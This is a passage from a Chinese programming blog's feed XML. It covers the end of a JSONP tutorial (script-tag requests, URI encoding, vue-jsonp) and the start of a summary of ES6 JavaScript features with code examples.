class="keyword">return</span> <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(params[key])&#125;</span>`</span></span></span><br><span class="line"><span class="javascript">        &#125;).join(<span class="string">&#x27;&amp;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 创建 script 标签</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        script.setAttribute(<span class="string">&#x27;src&#x27;</span>, <span class="string">`<span class="subst">$&#123;url&#125;</span>?<span class="subst">$&#123;paramString&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// id自增，保证唯一</span></span></span><br><span class="line">        JSONP.callbackId++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    JSONP(&#123;</span><br><span class="line"><span class="javascript">        url: <span class="string">&#x27;http://localhost:8080/api/jsonps&#x27;</span>,</span></span><br><span class="line">        params: &#123;</span><br><span class="line"><span class="javascript">            a: <span class="string">&#x27;2&amp;b=3&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            b: <span class="string">&#x27;4&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        callbackKey: <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback (res) &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    JSONP(&#123;</span><br><span class="line"><span class="javascript">        url: <span class="string">&#x27;http://localhost:8080/api/jsonp&#x27;</span>,</span></span><br><span class="line">        params: &#123;</span><br><span class="line">            id: 1</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        callbackKey: <span class="string">&#x27;cb&#x27;</span>,</span></span><br><span class="line">        callback (res) &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意 ⚠️：</p><p><code>encodeURI</code>和<code>encodeURIComponent</code>的区别：</p><ul><li><code>encodeURI()</code>不会对本身属于 URI 的特殊字符进行编码，例如冒号、正斜杠、问号和井字号；</li><li>而<code>encodeURIComponent()</code>则会对它发现的任何非标准字符进行编码</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;https://lindaidai.wang&#x27;</span><span class="built_in">encodeURI</span>(url) <span class="comment">// &quot;https://lindaidai.wang&quot;encodeURIComponent(url) // &quot;https%3A%2F%2Flindaidai.wang&quot;</span></span><br></pre></td></tr></table></figure><p>另外，可以使用<code>decodeURIComponent</code>来解码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">decodeURIComponent</span>(<span class="string">&quot;https%3A%2F%2Flindaidai.wang&quot;</span>); <span class="comment">// &#x27;https://lindaidai.wang&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="如何在-Vue-项目中发送-jsonp-请求"><a href="#如何在-Vue-项目中发送-jsonp-请求" class="headerlink" title="如何在 Vue 项目中发送 jsonp 请求"></a>如何在 Vue 项目中发送 jsonp 请求</h3><h4 id="使用-vue-jsonp"><a href="#使用-vue-jsonp" class="headerlink" title="使用 vue-jsonp"></a>使用 vue-jsonp</h4><p>官方地址：<a href="https://www.npmjs.com/package/vue-jsonp">vue-jsonp</a></p><ul><li>下载</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-jsonp --save-dev</span><br></pre></td></tr></table></figure><ul><li>引入项目</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &#39;vue&#39;import &#123;VueJsonp&#125; from &#39;vue-jsonp&#39; &#x2F;&#x2F;切记 要加&#123;&#125;Vue.use(VueJsonp)</span><br></pre></td></tr></table></figure><ul><li>然后，我们就可以在项目中愉快地使用啦 ✨✨</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;...&#125;,</span><br><span class="line">    <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="built_in">this</span>.getJson()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">window</span>.jsonpCallback = <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(data.token)</span><br><span class="line">            <span class="comment">// 调用获取后端token的方法</span></span><br><span class="line">            <span class="built_in">this</span>.getToken(data.token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        <span class="function"><span class="title">getJson</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.$jsonp(<span class="built_in">this</span>.url, &#123;</span><br><span class="line">            callbackQuery: <span class="string">&quot;callbackParam&quot;</span>,</span><br><span class="line">            callbackName: <span class="string">&quot;jsonpCallback&quot;</span></span><br><span class="line">          &#125;)</span><br><span class="line">            .then(<span class="function">(<span class="params">json</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 返回的jsonp数据不会放这里，而是在 window.jsonpCallback</span></span><br><span class="line">              <span class="built_in">console</span>.log(json)</span><br><span class="line">            &#125;)    </span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="title">getToken</span>(<span class="params">token</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.axios.post(<span class="string">&#x27;/xxxurl&#x27;</span>)</span><br><span class="line">                .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// success 之后就正常登陆了</span></span><br><span class="line">                &#125;)</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;   </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>ES6-ES12总汇</title>
    <link href="http://aiolimp.com/2021/07/28/ES6-ES12%E6%80%BB%E6%B1%87/"/>
    <id>http://aiolimp.com/2021/07/28/ES6-ES12%E6%80%BB%E6%B1%87/</id>
    <published>2021-07-28T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.205Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="1、let-和-const"><a href="#1、let-和-const" class="headerlink" title="1、let 和 const"></a>1、let 和 const</h3><p>这两个的出现，总感觉是为了开发的代码规范而出现的。我们要逐渐放弃var，在项目中多用let和const</p><p>与var的区别：</p><ul><li>var有变量提升，有初始化提升，值可变</li><li>let有变量提升，没有初始化提升，值可变</li><li>const有变量提升，没有初始化提升，值不可变，但如果是定义对象，则属性可变</li></ul><p><code>暂时性死区</code>问题说明：其实<code>let和const</code>是有变量提升的，但是没有初始化提升：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name)</span><br><span class="line">  <span class="keyword">let</span> name = <span class="string">&#x27;sunshin_lin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// Cannot access &#x27;name&#x27; before initialization</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>块级作用域解决问题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="comment">// 5 5 5 5 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="comment">// 0 1 2 3 4</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="2、默认参数"><a href="#2、默认参数" class="headerlink" title="2、默认参数"></a>2、默认参数</h3><p>开发中你曾遇到过这样的问题，如果参数不传进来，你就设置默认参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = name || <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line">  <span class="keyword">var</span> age = age || <span class="number">18</span></span><br><span class="line">  <span class="built_in">console</span>.log(name, age)</span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// 林三心 18</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>但是这么写确实不优雅，可以使用ES6的默认参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">name = <span class="string">&#x27;林三心&#x27;</span>, age = <span class="number">18</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name, age)</span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// 林三心 18</span></span><br><span class="line">fn(<span class="string">&#x27;sunshine&#x27;</span>, <span class="number">22</span>) <span class="comment">// sunshine 22</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="3、扩展运算符"><a href="#3、扩展运算符" class="headerlink" title="3、扩展运算符"></a>3、扩展运算符</h3><p>曾经的我，想要拼接多个数组，我只能这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = arr1.concat(arr2).concat(arr3)</span><br><span class="line">[</span><br><span class="line">  <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">  <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span></span><br><span class="line">]</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>现在的我，可以更优雅地进行拼接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [...arr1, ...arr2, ...arr3]</span><br><span class="line">[</span><br><span class="line">  <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">  <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span></span><br><span class="line">]</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="4、剩余参数"><a href="#4、剩余参数" class="headerlink" title="4、剩余参数"></a>4、剩余参数</h3><p>大家可能遇到过这种问题，一个函数，传入参数的个数是不确定的，这就可以用ES6的剩余参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">name, ...params</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name)</span><br><span class="line">  <span class="built_in">console</span>.log(params)</span><br><span class="line">&#125;</span><br><span class="line">fn (<span class="string">&#x27;林三心&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 林三心 [ 1, 2 ]</span></span><br><span class="line">fn (<span class="string">&#x27;林三心&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) <span class="comment">// 林三心 [ 1, 2, 3, 4, 5 ]</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="5、模板字符串"><a href="#5、模板字符串" class="headerlink" title="5、模板字符串"></a>5、模板字符串</h3><p>以前的我，拼接字符串只能这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line"><span class="keyword">const</span> age = <span class="string">&#x27;22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(name + <span class="string">&#x27;今年&#x27;</span> + age + <span class="string">&#x27;岁啦&#x27;</span>) <span class="comment">// 林三心今年22岁啦</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>现在我可以这么做，会更优雅</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;林三心&#x27;</span></span><br><span class="line"><span class="keyword">const</span> age = <span class="string">&#x27;22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;name&#125;</span>今年<span class="subst">$&#123;age&#125;</span>岁啦`</span>) <span class="comment">// 林三心今年22岁啦</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="6、Object-keys"><a href="#6、Object-keys" class="headerlink" title="6、Object.keys"></a>6、Object.keys</h3><p>可以用来获取对象的key的集合，进而可以获得对应key的value</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;林三心&#x27;</span>,</span><br><span class="line">  age: <span class="number">22</span>,</span><br><span class="line">  gender: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line"><span class="built_in">console</span>.log(keys) <span class="comment">// [ &#x27;name&#x27;, &#x27;age&#x27;, &#x27;gender&#x27; ]</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="7、箭头函数"><a href="#7、箭头函数" class="headerlink" title="7、箭头函数"></a>7、箭头函数</h3><p>以前我们使用普通函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ES6新加了<code>箭头函数</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="function">() =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果只有一个参数，可以省略括号</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">name</span> =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果函数体里只有一句return</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 可简写为</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">name</span> =&gt;</span> <span class="number">2</span> * name</span><br><span class="line"><span class="comment">// 如果返回的是对象</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">name</span> =&gt;</span> (&#123; <span class="attr">name</span>: name &#125;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>普通函数和箭头函数的区别：</p><ul><li>1、箭头函数不可作为构造函数，不能使用new</li><li>2、箭头函数没有自己的this</li><li>3、箭头函数没有arguments对象</li><li>4、箭头函数没有原型对象</li></ul><h3 id="8、Array-forEach"><a href="#8、Array-forEach" class="headerlink" title="8、Array.forEach"></a>8、Array.forEach</h3><p>ES6新加的数组遍历方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eachArr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三个参数：遍历项 索引 数组本身</span></span><br><span class="line"><span class="comment">// 配合箭头函数</span></span><br><span class="line">eachArr.forEach(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, arr)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"><span class="number">2</span> <span class="number">1</span> [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"><span class="number">3</span> <span class="number">2</span> [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"><span class="number">4</span> <span class="number">3</span> [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"><span class="number">5</span> <span class="number">4</span> [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="9、Array-map"><a href="#9、Array-map" class="headerlink" title="9、Array.map"></a>9、Array.map</h3><p>常用于返回一个处理过后的新数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mapArr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三个参数：遍历项 索引 数组本身</span></span><br><span class="line"><span class="comment">// 配合箭头函数，对每一个元素进行翻倍</span></span><br><span class="line"><span class="keyword">const</span> mapArr2 = mapArr.map(<span class="function">(<span class="params">num, index, arr</span>) =&gt;</span> <span class="number">2</span> * num)</span><br><span class="line"><span class="built_in">console</span>.log(mapArr2)</span><br><span class="line">[ <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span> ]</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="10、Array-filter"><a href="#10、Array-filter" class="headerlink" title="10、Array.filter"></a>10、Array.filter</h3><p>顾名思义，用来过滤的方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filterArr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三个参数：遍历项 索引 数组本身</span></span><br><span class="line"><span class="comment">// 配合箭头函数，返回大于3的集合</span></span><br><span class="line"><span class="keyword">const</span> filterArr2 = filterArr.filter(<span class="function">(<span class="params">num, index, arr</span>) =&gt;</span> num &gt; <span class="number">3</span>)</span><br><span class="line"><span class="built_in">console</span>.log(filterArr2)</span><br><span class="line">[ <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="11、Array-some"><a href="#11、Array-some" class="headerlink" title="11、Array.some"></a>11、Array.some</h3><p>some，意思就是只有一个是真，那就返回真</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someArr = [<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三个参数：遍历项 索引 数组本身</span></span><br><span class="line"><span class="comment">// 配合箭头函数，只要有一个为true，就返回true，一个都true都没有，就返回false</span></span><br><span class="line"><span class="keyword">const</span> someArr2 = someArr.some(<span class="function">(<span class="params">bol, index, arr</span>) =&gt;</span> bol)</span><br><span class="line"><span class="built_in">console</span>.log(someArr2)</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="12、Array-every"><a href="#12、Array-every" class="headerlink" title="12、Array.every"></a>12、Array.every</h3><p>every跟some是相反的，some是只有一个就行，every是要所有为真才返回真</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> everyArr = [<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三个参数：遍历项 索引 数组本身</span></span><br><span class="line"><span class="comment">// 配合箭头函数，需要所有为true，才返回true，否则返回false</span></span><br><span class="line"><span class="keyword">const</span> everyArr2 = everyArr.every(<span class="function">(<span class="params">bol, index, arr</span>) =&gt;</span> bol)</span><br><span class="line"><span class="built_in">console</span>.log(everyArr2)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="13、Array-reduce"><a href="#13、Array-reduce" class="headerlink" title="13、Array.reduce"></a>13、Array.reduce</h3><ul><li>第一个参数callback函数： pre为上次return的值，next为数组的本次遍历的项</li><li>第二个参数为初始值，也是第一个pre</li></ul><p>举两个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计算 1 + 2 + 3 + 4 + 5</span></span><br><span class="line"><span class="keyword">const</span> reduceArr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="keyword">const</span> sum = reduceArr.reduce(<span class="function">(<span class="params">pre, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> pre + next</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum) <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计元素出现个数</span></span><br><span class="line"><span class="keyword">const</span> nameArr = [<span class="string">&#x27;林三心&#x27;</span>, <span class="string">&#x27;sunshine_lin&#x27;</span>, <span class="string">&#x27;林三心&#x27;</span>, <span class="string">&#x27;林三心&#x27;</span>, <span class="string">&#x27;科比&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> totalObj = nameArr.reduce(<span class="function">(<span class="params">pre, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (pre[next]) &#123;</span><br><span class="line">    pre[next]++</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pre[next] = <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  